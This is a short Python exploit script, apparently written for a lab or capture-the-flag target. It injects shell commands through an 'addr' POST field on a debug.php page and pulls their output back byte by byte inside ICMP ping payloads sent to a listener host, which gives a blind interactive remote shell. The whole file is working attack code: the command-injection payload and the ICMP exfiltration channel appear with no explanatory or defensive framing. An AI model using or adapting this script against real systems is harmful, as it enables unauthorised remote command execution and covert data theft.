from scapy.all import *
from threading import Thread
from requests import post

def pingListen():
  pkts = sniff(iface="eth1", timeout=1)

  for packet in pkts:
    if packet.getlayer(ICMP):
      if str(packet.getlayer(ICMP).type) == "8":
        sys.stdout.write(packet.getlayer(Raw).load[-1])


if __name__ == "__main__":
  while True:
    try:
      sys.stdout.write('# ')
      command = sys.stdin.readline().strip()
      thread = Thread(target=pingListen)
      thread.start()
      payload = "; TEST=$(%s 2>&1 | xxd -c 1 -ps); for TEST2 in $TEST; do ping -c 1 -p $TEST2 192.168.57.102; done"%command
      r = post('http://192.168.57.101/debug.php', data={"addr":payload})
      thread.join()
    except KeyboardInterrupt:
      break
